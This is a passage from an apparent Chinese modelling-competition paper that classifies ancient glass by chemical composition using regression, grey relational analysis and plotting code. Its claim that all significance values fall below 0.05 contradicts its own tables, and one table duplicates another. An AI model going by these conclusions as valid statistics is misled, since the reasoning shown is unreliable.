</center>其中，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps133.jpg)为各项系数，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps134.jpg)为误差值。<p>在无风化高钾玻璃类别中，我们使用SPASS软件进行多次计算，获得如下回归模型分析表5-13。</p><p>因变量：氧化钙</p><p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-13 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps139.jpg) | 0.844 | 0.713 | 0.659     | 1.556     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-2.103</td><td>-3.145</td><td>0.006</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps140.jpg" alt="img"></td><td>0.121</td><td>5.195</td><td>0.000</td><td>1.300</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps141.jpg" alt="img"></td><td>-0.036</td><td>-1.048</td><td>0.310</td><td>1.218</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps142.jpg" alt="img"></td><td>0.261</td><td>4.987</td><td>0.000</td><td>1.275</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps53.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps54.jpg" style="zoom:80%;" /></center><center>   图5-17 氧化钙直方图           图5-18 正态P-P图</center>因变量：氧化铜<p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-14 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps148.jpg) | 0.904 | 0.818 | 0.785     | 1.260     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-1.782</td><td>-1.613</td><td>0.125</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps149.jpg" alt="img"></td><td>0.024</td><td>0.596</td><td>0.559</td><td>1.404</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps150.jpg" alt="img"></td><td>0.303</td><td>8.550</td><td>0.000</td><td>1.061</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps151.jpg" alt="img"></td><td>0.039</td><td>0.539</td><td>0.678</td><td>1.475</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps55.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps56.jpg" style="zoom:80%;" /></center><center>图5-19 氧化铜直方图  图5-20 氧化钙正态P-P图</center>因变量：氧化钠<p>预测变量：（常量），氧化铝<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps154.jpg" alt="img">，氧化钡<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps155.jpg" alt="img">，氧化铅<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps156.jpg" alt="img">，氧化铜<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps157.jpg" alt="img"></p><p>表5-15 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps158.jpg" alt="img"></td><td>0.904</td><td>0.818</td><td>0.785</td><td>1.260</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>1.504</td><td>.241</td><td>.891</td><td></td></tr><tr><td>氧化铅</td><td>-.047</td><td>-.401</td><td>.705</td><td>5.436</td></tr><tr><td>氧化钡</td><td>.249</td><td>.779</td><td>.471</td><td>6.629</td></tr><tr><td>氧化铜</td><td>1.191</td><td>2.652</td><td>.045</td><td>1.476</td></tr><tr><td>氧化铝</td><td>-.059</td><td>-.208</td><td>.843</td><td>11.614</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps159.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps160.jpg" alt="img"> </p><p>​            图5-20 氧化钠直方图                             图5-21 氧化钠正态P-P图</p><p>因变量：氧化钡            预测变量：（常量），氧化铜</p><p>表5-16 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps162.jpg" alt="img"></td><td>0.902</td><td>0.813</td><td>0.803</td><td>1.118</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>4.658</td><td>6.213</td><td>0.000</td><td></td></tr><tr><td>氧化铜</td><td>2.718</td><td>9.091</td><td>0.000</td><td>1.000</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps163.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps164.jpg" alt="img"> </p><p>​         图5-22 氧化钡直方图                            图 5-23 氧化钡 P-P图</p><p>以上分析可知，所有的显著性都满足小于0.05的条件，故多元回归方程可行。在无风化条件下，如果以上化学成分不满足高钾玻璃的情况，那么将其归类为铅钡玻璃。在风化条件下，我们发现可以看高钾玻璃的成分情况与数据规律统计表对比，如果不符合高钾玻璃则为铅钡玻璃。</p><p>将表单3数据输入，首先将数据分类为风化和未风化。分析风化数据我们首先依据数据规律统计表，如果符合就符合个数加1，通过对符合高钾和铅钡玻璃的条件的个数进行判断该未知文物类型。最终判断结果如表5-17所示。</p><p>表5-17 玻璃文物分类表</p><table><thead><tr><th></th><th>高钾玻璃</th><th>铅钡玻璃</th></tr></thead><tbody><tr><td>A2</td><td>6</td><td>2</td></tr><tr><td>A5</td><td>1</td><td>6</td></tr><tr><td>A6</td><td>8</td><td>0</td></tr><tr><td>A7</td><td>7</td><td>0</td></tr></tbody></table><p>但A2表数据缺失较多，但是含有类型特征较强的氧化铝，氧化铅，五氧化二磷3种化学成分，形成新的比例：高钾玻璃：铅钡玻璃=1：2，所以A2更可能是铅钡玻璃。</p><p>分析未风化数据，我们首先利用回归方程进行计算得：</p><table><thead><tr><th></th><th>氧化钠</th><th>氧化钙</th><th>氧化铜</th><th>氧化钡</th></tr></thead><tbody><tr><td>A1</td><td>3.59044</td><td>-0.21597</td><td>-1.50003</td><td>10.39298</td></tr><tr><td>A3</td><td>-0.27902</td><td>3.28207</td><td>0.70326</td><td>5.22878</td></tr><tr><td>A6</td><td>1.08907</td><td>2.38099</td><td>1.59438</td><td>7.26728</td></tr><tr><td>A7</td><td>11.11155</td><td>0.61212</td><td>2.24646</td><td>29.14718</td></tr></tbody></table><p>综上，高钾玻璃分别是A1,A4,A6,A7,铅钡玻璃分别是A2,A3,A5,A8</p><h4 id="5-4问题四的求解与分析"><a href="#5-4问题四的求解与分析" class="headerlink" title="5.4问题四的求解与分析"></a>5.4问题四的求解与分析</h4><p>我们可以使用灰色关联分析的方式对比较不同类别之间的化学成分关联关系的差异性</p><h5 id="5-4-1-数据无量纲化处理"><a href="#5-4-1-数据无量纲化处理" class="headerlink" title="5.4.1 数据无量纲化处理"></a>5.4.1 数据无量纲化处理</h5><p>将题目给出表单2中，原始分类中的未经过风化的高钾玻璃与铅钡玻璃的数据分别导入SPSS，并通过Z-score标准化法对其中各项数据进行无量纲化。</p><p>Z-score标准化法公式如下：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps165.jpg" alt="img"> </p><p>Z-score标准化法,首先计算该指标的均值<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps166.jpg" alt="img">和标准差，然后用该变量的每一个观察值x减去均值x，再除以其标准差。</p><p>数据经过Z-score标准化后，将符合标准正态分布（0-1），即将有约一半观察值的数值小于0，另一半观察值的数值大于0，变量的均值为0，标准差为1，在本题的求解过程中，数据的标准化通过SPSS软件对数据分析获取[4]。</p><h5 id="5-4-2-灰色关联分析不同类别之间的化学成分关联关系"><a href="#5-4-2-灰色关联分析不同类别之间的化学成分关联关系" class="headerlink" title="5.4.2 灰色关联分析不同类别之间的化学成分关联关系"></a>5.4.2 灰色关联分析不同类别之间的化学成分关联关系</h5><p>将数据转置生成如下矩阵：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps167.jpg" alt="img"> </p><p>其中参数m是变量类型，结合表单2可知，在当前数据集下m=14</p><p>关联程度实质是参考数列与比较数列曲线形状的相似程度。凡比较数列与参考数列的曲线形状接近，则两者间的关联度较大；反之，如果曲线形状相差较大，则两者间的关联度较小。因此，可用曲线间的差值大小作为关联度的衡量标准。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps168.jpg" alt="img"> </p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps169.jpg" alt="img"> </p><p>其中ρ为分辨系数,用于降低Δ(max)过大而使关联系数出现较大误差，其取值范围(0,1)。当ρ越小，关联系数间差异越大，区分能力越强。在实现过程中ρ取值为0.5.</p><p>在本题的求解过程中，通过Matlab编程实现计算每个被评价对象指标序列，参考序列对应元素的绝对差值，并最终求出关联系数，并对其进行排序。（实现代码见附录）</p><h5 id="5-4-3-差异性分析"><a href="#5-4-3-差异性分析" class="headerlink" title="5.4.3 差异性分析"></a>5.4.3 差异性分析</h5><p>最后对关联度进行排序，得到相应类型下的关联度顺序。</p><p>其中高钾玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">19.0240</span> <span class="token number">18.1279</span> <span class="token number">18.2748</span> <span class="token number">19.2907</span> <span class="token number">20.5374</span> <span class="token number">19.9724</span> <span class="token number">18.3470</span> <span class="token number">18.1501</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span> <span class="token number">18.5236</span> <span class="token number">20.0456</span> <span class="token number">21.3854</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，7，13，3，11，5，2，4，12，8，10，9，6，14</p><p>不同的是铅钡玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">21.3854</span> <span class="token number">20.5374</span> <span class="token number">20.0456</span> <span class="token number">19.9724</span> <span class="token number">19.2907</span> <span class="token number">19.0240</span> <span class="token number">18.5236</span> <span class="token number">18.3470</span> <span class="token number">18.2748</span> <span class="token number">18.1501</span> <span class="token number">18.1279</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，14，6，13，7，5，2，12，8, 4，9 ，3，10，11</p><p>比较二者关联度顺序，即可证明不同类别之间的化学成分关联具有显著差异性</p><h3 id="六、模型的评价与推广"><a href="#六、模型的评价与推广" class="headerlink" title="六、模型的评价与推广"></a>六、模型的评价与推广</h3><h4 id="6-1模型的优点"><a href="#6-1模型的优点" class="headerlink" title="6.1模型的优点"></a>6.1模型的优点</h4><p>在分析文物样品表面有无风化化学成分含量的统计规律时，将整个决策过程分为两部分，分别基于多元回归和最小二乘法进行拟合，保证了数据分析结果的可靠。</p><p>在实现系统聚类后，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。</p><p>使用灰色关联分析方式能够很好的处理部分信息未知、部分信息已知的数据。</p><h4 id="6-2-模型的缺点"><a href="#6-2-模型的缺点" class="headerlink" title="6.2 模型的缺点"></a>6.2 模型的缺点</h4><p>进行亚类划分时，系统聚类完成后又加以统计学分析，对于一些规律不很明显的组合进行人工干预重新组合，虽然有利于划分，但在客观上也导致了模型主观性成分的提高。</p><h4 id="6-3-模型的优化"><a href="#6-3-模型的优化" class="headerlink" title="6.3 模型的优化"></a>6.3 模型的优化</h4><p>题目附件中数据量较少，随着建模过程的不断深入及划分亚类之后，每种亚类之间的数据量也过少，划分有较大误差。可以通过获取更大数据集对模型进行优化。</p><h3 id="七、参考文献"><a href="#七、参考文献" class="headerlink" title="七、参考文献"></a>七、参考文献</h3><p>[1] 李青会,干福熹 .关于中国古代玻璃研究的几个问题[J]. 自然科学史研究，2007年，26卷：234-247</p><p>[2] 段浩,干福熹,赵虹霞.实验室模拟过渡金属离子掺杂的中国古代玻璃的着色现象[J]. 硅酸盐学报 2009年12期</p><p>[3] 孙林,刘梦含,徐久成.基于优化初始聚类中心和轮廓系数的K-means聚类算法[J].模糊系统与数学,2022,36(01):47-65.</p><p>[4] 孙芳芳.浅议灰色关联度分析方法及其应用[J].科技信息, 2010</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>附录说明：</p><ol><li><p>各类玻璃元素对比组成可视化python实现</p></li><li><p>高钾玻璃各组成成分的拟合曲线python实现代码</p></li><li><p>对高钾玻璃、铅钡玻璃进行亚分类的划分结果</p></li><li><p>灰色关联分析Matlab代码实现</p></li><li><p>表单2数据规律统计表</p></li></ol><h4 id="附录1-各类玻璃元素对比组成可视化python实现"><a href="#附录1-各类玻璃元素对比组成可视化python实现" class="headerlink" title="附录1  各类玻璃元素对比组成可视化python实现"></a>附录1  各类玻璃元素对比组成可视化python实现</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment">#字体设置为黑体</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"二氧化硅"</span><span class="token punctuation">,</span><span class="token string">"氧化钠"</span><span class="token punctuation">,</span><span class="token string">"氧化钾"</span><span class="token punctuation">,</span><span class="token string">"氧化钙"</span><span class="token punctuation">,</span><span class="token string">"氧化镁"</span><span class="token punctuation">,</span><span class="token string">"氧化铝"</span><span class="token punctuation">,</span><span class="token string">"氧化铁"</span><span class="token punctuation">,</span><span class="token string">"氧化铜"</span><span class="token punctuation">,</span><span class="token string">"氧化铅"</span><span class="token punctuation">,</span><span class="token string">"氧化钡"</span><span class="token punctuation">,</span><span class="token string">"五氧化二磷"</span><span class="token punctuation">,</span><span class="token string">"氧化锶"</span><span class="token punctuation">,</span><span class="token string">"氧化锡"</span><span class="token punctuation">,</span><span class="token string">"二氧化硫"</span><span class="token punctuation">)</span>y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">68.71125</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9.031428571</span><span class="token punctuation">,</span><span class="token number">5.541428571</span><span class="token punctuation">,</span><span class="token number">1.462857143</span><span class="token punctuation">,</span><span class="token number">6.8525</span><span class="token punctuation">,</span><span class="token number">2.768571429</span><span class="token punctuation">,</span><span class="token number">2.895</span><span class="token punctuation">,</span><span class="token number">0.642</span><span class="token punctuation">,</span><span class="token number">1.795</span><span class="token punctuation">,</span><span class="token number">1.75</span><span class="token punctuation">,</span><span class="token number">0.0975</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.406666667</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">94.286</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">0.712</span><span class="token punctuation">,</span><span class="token number">0.54</span><span class="token punctuation">,</span><span class="token number">1.616</span><span class="token punctuation">,</span><span class="token number">0.248</span><span class="token punctuation">,</span><span class="token number">1.764</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.3675</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.095</span><span class="token punctuation">,</span><span class="token number">2.48</span><span class="token punctuation">,</span><span class="token number">13.525</span><span class="token punctuation">,</span><span class="token number">8.485</span><span class="token punctuation">,</span><span class="token number">0.52</span><span class="token punctuation">,</span><span class="token number">6.17</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">2.9</span><span class="token punctuation">,</span><span class="token number">0.11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1.27</span><span class="token punctuation">,</span><span class="token number">0.04</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.47</span><span class="token punctuation">,</span><span class="token number">3.38</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">,</span><span class="token number">8.23</span><span class="token punctuation">,</span><span class="token number">0.66</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">,</span><span class="token number">1.62</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.16</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>x<span class="token punctuation">,</span> str1<span class="token punctuation">,</span> rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y1<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y3<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y4<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录2-高钾玻璃各组成成分的拟合曲线python实现代码"><a href="#附录2-高钾玻璃各组成成分的拟合曲线python实现代码" class="headerlink" title="附录2 高钾玻璃各组成成分的拟合曲线python实现代码"></a>附录2 高钾玻璃各组成成分的拟合曲线python实现代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LinearRegressionplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment">#实例化线性模型****</span>lr <span class="token operator">=</span> LinearRegression<span class="token punctuation">(</span><span class="token punctuation">)</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">69.33</span><span class="token punctuation">,</span><span class="token number">87.05</span><span class="token punctuation">,</span><span class="token number">61.71</span><span class="token punctuation">,</span><span class="token number">65.88</span><span class="token punctuation">,</span><span class="token number">61.58</span><span class="token punctuation">,</span><span class="token number">67.65</span><span class="token punctuation">,</span><span class="token number">59.81</span><span class="token punctuation">,</span><span class="token number">92.63</span><span class="token punctuation">,</span><span class="token number">95.02</span><span class="token punctuation">,</span><span class="token number">96.77</span><span class="token punctuation">,</span><span class="token number">94.29</span><span class="token punctuation">,</span><span class="token number">92.35</span><span class="token punctuation">,</span><span class="token number">92.72</span><span class="token punctuation">,</span><span class="token number">59.01</span><span class="token punctuation">,</span><span class="token number">65.18</span><span class="token punctuation">,</span><span class="token number">62.47</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">9.99</span><span class="token punctuation">,</span><span class="token number">5.19</span><span class="token punctuation">,</span><span class="token number">12.37</span><span class="token punctuation">,</span><span class="token number">9.67</span><span class="token punctuation">,</span><span class="token number">10.95</span><span class="token punctuation">,</span><span class="token number">7.37</span><span class="token punctuation">,</span><span class="token number">7.68</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.59</span><span class="token punctuation">,</span><span class="token number">0.92</span><span class="token punctuation">,</span><span class="token number">1.01</span><span class="token punctuation">,</span><span class="token number">0.74</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12.53</span><span class="token punctuation">,</span><span class="token number">14.52</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.93</span><span class="token punctuation">,</span><span class="token number">4.06</span><span class="token punctuation">,</span><span class="token number">5.5</span><span class="token punctuation">,</span><span class="token number">6.44</span><span class="token punctuation">,</span><span class="token number">7.5</span><span class="token punctuation">,</span><span class="token number">11.15</span><span class="token punctuation">,</span><span class="token number">10.05</span><span class="token punctuation">,</span><span class="token number">1.98</span><span class="token punctuation">,</span><span class="token number">1.32</span><span class="token punctuation">,</span><span class="token number">0.81</span><span class="token punctuation">,</span><span class="token number">1.46</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">6.16</span><span class="token punctuation">,</span><span class="token number">6.18</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.87</span><span class="token punctuation">,</span><span class="token number">0.78</span><span class="token punctuation">,</span><span class="token number">5.09</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">3.27</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">1.56</span><span class="token punctuation">,</span><span class="token number">1.55</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">0.55</span><span class="token punctuation">,</span><span class="token number">1.54</span><span class="token punctuation">,</span><span class="token number">4.73</span><span class="token punctuation">,</span><span class="token number">1.07</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'二氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'二氧化硅与氧化铜含量散点拟合曲线'</span><span class="token punctuation">)</span>mymodel <span class="token operator">=</span> numpy<span class="token punctuation">.</span>poly1d<span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>myline <span class="token operator">=</span> numpy<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token comment"># 原始散点图</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>myline<span class="token punctuation">,</span> mymodel<span class="token punctuation">(</span>myline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 多项式回归</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果"><a href="#附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果" class="headerlink" title="附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果"></a>附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果</h4><p>高钾玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps170.jpg" alt="img"> </p><p>铅钡玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps171.jpg" alt="img"> </p><h4 id="附录4-灰色关联分析Matlab实现代码"><a href="#附录4-灰色关联分析Matlab实现代码" class="headerlink" title="附录4 灰色关联分析Matlab实现代码"></a>附录4 灰色关联分析Matlab实现代码</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.97731</span> <span class="token number">1.29178</span> <span class="token number">0.74085</span> <span class="token number">0.1866</span> <span class="token operator">-</span><span class="token number">0.60495</span> <span class="token operator">-</span><span class="token number">0.45975</span> <span class="token operator">-</span><span class="token number">0.96173</span> <span class="token operator">-</span><span class="token number">0.19092</span> <span class="token number">2.43346</span> <span class="token number">0.39734</span> <span class="token operator">-</span><span class="token number">0.49958</span> <span class="token number">0.05052</span> <span class="token operator">-</span><span class="token number">0.21996</span> <span class="token number">0.14428</span> <span class="token operator">-</span><span class="token number">0.1428</span> <span class="token operator">-</span><span class="token number">0.57176</span> <span class="token number">0.42721</span> <span class="token number">0.11773</span> <span class="token operator">-</span><span class="token number">1.71013</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">3.74896</span> <span class="token number">2.18943</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.11262</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.89238</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span><span class="token punctuation">;</span><span class="token number">0.26337</span> <span class="token operator">-</span><span class="token number">0.0789</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.85457</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token 